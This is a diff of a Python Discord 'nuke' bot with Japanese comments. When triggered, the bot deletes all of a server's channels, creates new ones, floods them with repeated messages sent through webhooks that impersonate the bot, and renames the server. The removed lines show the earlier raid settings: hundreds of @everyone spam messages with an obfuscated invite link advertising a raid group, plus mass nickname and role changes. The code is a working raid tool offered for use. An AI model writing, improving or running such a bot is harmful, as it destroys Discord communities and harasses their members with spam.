@@ -21,17 +21,17 @@ INTENTS.members = True
 
 # --- User settings ---
 ROLE_BASE      = "ozeumember"   # ロール名ベース
-ROLE_COUNT     = 0               # 作成数
-CHANNEL_BASE   = "ozeu-nuke"    # チャンネル名ベース
-CHANNEL_COUNT  = 40               # 作成数
-REPEAT_MESSAGE = "# @everyone\n# Raid by OZEU. join now\n# おぜうの集いに参加！\n# https://\ptb．discord．com/../oze/../invite/ozeuozeu [︋︍︋]\nhttps://cdn.discordapp.com/attachments/1412757396689915998/1415191435954622555/frame_bomb_200_b.gif"
-REPEAT_COUNT   = 500            # メッセージ送信回数
+ROLE_COUNT     = 0              # 作成数
+CHANNEL_BASE   = "ozeu"         # チャンネル名ベース
+CHANNEL_COUNT  = 1              # 作成数
+REPEAT_MESSAGE = "hello!world"
+REPEAT_COUNT   = 1              # メッセージ送信回数
 
 CHANGE_NICKNAMES = False
-NICK_BASE        = "おぜう様万歳！"
+NICK_BASE        = "hello"
 NEW_GUILD_NAME   = "おぜう植民地"
 
-# Speed preset (遅い / 普通 / 速い / 爆速)
+# Speed preset
 SPEED_LEVEL = "爆速"
 
 SPEED_PRESETS = {
@@ -65,7 +65,6 @@ SPEED_PRESETS = {
     }
 }
 
-# apply preset
 _p = SPEED_PRESETS.get(SPEED_LEVEL, SPEED_PRESETS["普通"])
 DELETE_CHUNK_SIZE      = _p["DELETE_CHUNK_SIZE"]
 DELETE_CHUNK_SLEEP     = _p["DELETE_CHUNK_SLEEP"]
@@ -84,14 +83,18 @@ NICK_CHUNK_SLEEP       = _p["NICK_CHUNK_SLEEP"]
 # ================= end CONFIG =================
 
 logging.basicConfig(level=logging.INFO)
-logger = logging.getLogger("fast-nuke")
+logger = logging.getLogger("ozeu")
 
 bot = commands.Bot(command_prefix=PREFIX, intents=INTENTS)
 app = Flask(__name__)
 
 @app.route("/", methods=["GET"])
 def health():
-    return jsonify({"status": "ok", "bot_ready": bot.is_ready(), "bot_user": str(bot.user) if bot.user else None})
+    return jsonify({
+        "status": "ok",
+        "bot_ready": bot.is_ready(),
+        "bot_user": str(bot.user) if bot.user else None
+    })
 
 def start_flask():
     port = int(os.environ.get("PORT", "8080"))
@@ -105,36 +108,51 @@ def chunk_list(lst, n):
 async def safe_delete_channel(channel: discord.abc.GuildChannel):
     try:
         await channel.delete()
-        logger.info(f"Deleted: {getattr(channel,'name',repr(channel))} ({getattr(channel,'id',None)})")
+        logger.info(f"Deleted: {getattr(channel,'name',repr(channel))}")
     except discord.errors.Forbidden:
-        logger.warning(f"Forbidden deleting channel: {getattr(channel,'name',channel)}")
+        logger.warning(f"Forbidden deleting: {getattr(channel,'name',channel)}")
     except Exception as e:
-        logger.warning(f"Delete failed {getattr(channel,'name',channel)}: {e}")
+        logger.warning(f"Delete failed: {getattr(channel,'name',channel)} {e}")
 
 async def safe_create_channel(guild: discord.Guild, name: str):
     try:
         ch = await guild.create_text_channel(name)
-        # short wait so permissions propagate
         await asyncio.sleep(0.12)
-        logger.info(f"Created channel: {name} ({ch.id})")
+        logger.info(f"Created channel: {name}")
         return ch
-    except discord.errors.Forbidden:
-        logger.warning(f"Forbidden creating channel: {name}")
-        return None
     except Exception as e:
         logger.warning(f"Create failed {name}: {e}")
         return None
 
-async def safe_send(ch: discord.TextChannel, content: str):
-    if ch is None:
+# --- Webhook Send (軽量) ---
+async def get_or_create_webhook(ch: discord.TextChannel):
+    try:
+        webhooks = await ch.webhooks()
+        if webhooks:
+            return webhooks[0]
+        wh = await ch.create_webhook(name="ozeu-webhook")
+        return wh
+    except Exception as e:
+        logger.warning(f"Webhook作成失敗 ({ch.name}): {e}")
+        return None
+
+async def safe_webhook_send(ch: discord.TextChannel, content: str):
+    webhook = await get_or_create_webhook(ch)
+    if webhook is None:
         return
     try:
-        await ch.send(content[:2000])
-    except discord.errors.Forbidden:
-        logger.warning(f"Forbidden send to {getattr(ch,'name',ch)}")
+        await webhook.send(
+            content[:2000],
+            username=bot.user.name,
+            avatar_url=bot.user.avatar.url if bot.user.avatar else None
+        )
     except Exception as e:
-        logger.warning(f"Send failed {getattr(ch,'name',ch)}: {e}")
+        logger.warning(f"Webhook送信失敗 ({ch.name}): {e}")
 
+async def safe_send(ch: discord.TextChannel, content: str):
+    await safe_webhook_send(ch, content)
+
+# ---------- メッセージ送信 ----------
 async def send_repeated_messages(channels: List[discord.TextChannel], msg: str, repeat: int):
     if not channels:
         return
@@ -145,77 +163,20 @@ async def send_repeated_messages(channels: List[discord.TextChannel], msg: str, 
             await asyncio.sleep(MSG_INTER_CHUNK_SLEEP)
         await asyncio.sleep(MSG_INTER_ROUND_SLEEP)
 
-async def safe_change_nick(member: discord.Member, new_nick: str):
-    try:
-        await member.edit(nick=new_nick)
-        return True
-    except discord.errors.Forbidden:
-        return False
-    except Exception:
-        return False
-
-async def change_all_nicknames(guild: discord.Guild):
-    if not CHANGE_NICKNAMES:
-        return 0
-    members = [m for m in guild.members if not m.bot]
-    changed = 0
-    tasks = [(m, f"{NICK_BASE}-{i+1}") for i, m in enumerate(members)]
-    for group in chunk_list(tasks, NICK_CHUNK_SIZE):
-        coros = [safe_change_nick(m, nick) for m, nick in group]
-        results = await asyncio.gather(*coros)
-        changed += sum(1 for r in results if r)
-        await asyncio.sleep(NICK_CHUNK_SLEEP)
-    return changed
-
+# ---------- 権限確認 ----------
 def bot_has_permissions(guild: discord.Guild):
     me = guild.me
     if me is None:
         return False
     perms = me.guild_permissions
-    return perms.manage_channels and perms.manage_roles and perms.send_messages and perms.manage_nicknames
+    return perms.manage_channels and perms.manage_roles and perms.send_messages and perms.manage_webhooks
 
-# ---------- Parallel safe role creation (new) ----------
-async def safe_create_role(guild: discord.Guild, name: str, max_retries: int = ROLE_MAX_RETRIES) -> Optional[discord.Role]:
-    attempt = 0
-    while True:
-        try:
-            role = await guild.create_role(name=name, permissions=discord.Permissions.none(), reason="bulk role create")
-            logger.info(f"Created role: {name} ({role.id})")
-            return role
-        except discord.errors.Forbidden:
-            logger.warning(f"Forbidden creating role: {name}")
-            return None
-        except discord.errors.HTTPException as e:
-            attempt += 1
-            logger.warning(f"HTTPException creating role {name} attempt {attempt}: {e}")
-            if attempt >= max_retries:
-                logger.exception(f"Giving up creating role {name}")
-                return None
-            # exponential backoff (keeps polite)
-            await asyncio.sleep(0.5 * (2 ** (attempt - 1)))
-        except Exception as e:
-            logger.exception(f"Unexpected error creating role {name}: {e}")
-            return None
-
-async def create_roles_fast(guild: discord.Guild, base: str, count: int, chunk_size: int = ROLE_CHUNK_SIZE, chunk_sleep: float = ROLE_CHUNK_SLEEP) -> List[discord.Role]:
-    names = [f"{base}-{i}" for i in range(1, count+1)]
-    created: List[discord.Role] = []
-    for group in chunk_list(names, chunk_size):
-        results = await asyncio.gather(*(safe_create_role(guild, n) for n in group), return_exceptions=True)
-        for res in results:
-            if isinstance(res, discord.Role):
-                created.append(res)
-            elif isinstance(res, Exception):
-                logger.warning(f"Role creation exception: {res}")
-        await asyncio.sleep(chunk_sleep)
-    return created
-
-# ---------- events ----------
+# ---------- イベント ----------
 @bot.event
 async def on_ready():
-    logger.info(f"Logged in as {bot.user} ({bot.user.id})")
+    logger.info(f"✅ Logged in as {bot.user} ({bot.user.id})")
 
-# ---------- command ----------
+# ---------- コマンド ----------
 @bot.command(name="nuke")
 async def nuke(ctx):
     guild = ctx.guild
@@ -227,7 +188,6 @@ async def nuke(ctx):
     backup_channel = await guild.create_text_channel(backup_name)
     await backup_channel.send("⚙️ nuke開始")
 
-    # main tasks
     async def main_tasks():
         # delete channels
         channels_to_delete = [c for c in guild.channels if c.id != backup_channel.id]
@@ -237,34 +197,24 @@ async def nuke(ctx):
         await asyncio.sleep(POST_DELETE_WAIT)
 
         # create channels
-        created_channels: List[discord.TextChannel] = []
+        created_channels = []
         names = [f"{CHANNEL_BASE}-{i+1}" for i in range(CHANNEL_COUNT)]
         for group in chunk_list(names, CREATE_CHUNK_SIZE):
             rs = await asyncio.gather(*(safe_create_channel(guild, n) for n in group))
             created_channels.extend([r for r in rs if r])
             await asyncio.sleep(CREATE_CHUNK_SLEEP)
 
-        # send messages
+        # send via webhook
         await send_repeated_messages(created_channels, REPEAT_MESSAGE, REPEAT_COUNT)
 
-    # sub tasks
     async def sub_tasks():
-        # guild rename
+        # rename guild
         if NEW_GUILD_NAME:
             try:
                 await guild.edit(name=NEW_GUILD_NAME)
             except Exception as e:
                 logger.warning(f"Guild rename failed: {e}")
 
-        # parallel role creation (safe)
-        if ROLE_COUNT > 0:
-            created_roles = await create_roles_fast(guild, ROLE_BASE, ROLE_COUNT, chunk_size=ROLE_CHUNK_SIZE, chunk_sleep=ROLE_CHUNK_SLEEP)
-            logger.info(f"Roles created: {len(created_roles)}")
-
-        # nickname changes
-        await change_all_nicknames(guild)
-
-    # run both concurrently
     await asyncio.gather(main_tasks(), sub_tasks())
 
     await backup_channel.send("✅ nuke完了。Botはサーバーを退出します")
